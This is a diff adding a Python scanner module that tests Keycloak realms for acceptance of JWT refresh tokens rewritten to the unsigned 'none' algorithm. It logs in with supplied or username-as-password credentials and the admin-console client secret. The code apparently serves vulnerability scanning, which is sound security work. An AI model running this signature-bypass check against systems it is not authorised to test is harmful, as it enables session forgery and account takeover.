@@ -1,0 +1,49 @@
+from custom_logging import error, info, find
+from jwt_attack import change_to_none
+from keycloak_api import KeyCloakApi
+
+
+def test_none(api, client, client_secret, username, password):
+    try:
+        access_token, refresh_token = api.get_token(client, client_secret, username, password)
+        info('Got token via password method. access_token:{}, refresh_token:{}'.format(access_token, refresh_token))
+        none_refresh_token = change_to_none(refresh_token)
+        try:
+            access_token, refresh_token = api.refresh(client, none_refresh_token)
+            find('Refresh work with none. access_token:{}, refresh_token:{}'.format(access_token, refresh_token))
+        except Exception as e:
+            error('None refresh token fail : {}'.format(e))
+    except Exception as e:
+        error(e)
+
+
+class NoneSignScan:
+
+    def perform(self, launch_properties, scan_properties):
+
+        realms = scan_properties['realms'].keys()
+
+        for realm in realms:
+            clients = scan_properties['clients'][realm]
+            well_known = scan_properties['wellknowns'][realm]
+
+            api = KeyCloakApi(well_known)
+
+            if 'security-admin-console' not in scan_properties \
+                    or realm not in scan_properties['security-admin-console'] \
+                    or 'secret' not in scan_properties['security-admin-console'][realm]:
+                error('No secret for realm {}'.format(realm))
+                continue
+
+            client_secret = scan_properties['security-admin-console'][realm]['secret']
+
+            for client in clients:
+                if 'username' in launch_properties:
+                    username = launch_properties['username']
+                    if 'password' in launch_properties:
+                        password = launch_properties['password']
+                        test_none(api, client, client_secret, username, password)
+                    else:
+                        test_none(api, client, client_secret, username, username)
+                else:
+                    info('No none scan, provide credentials to test jwt none signature')
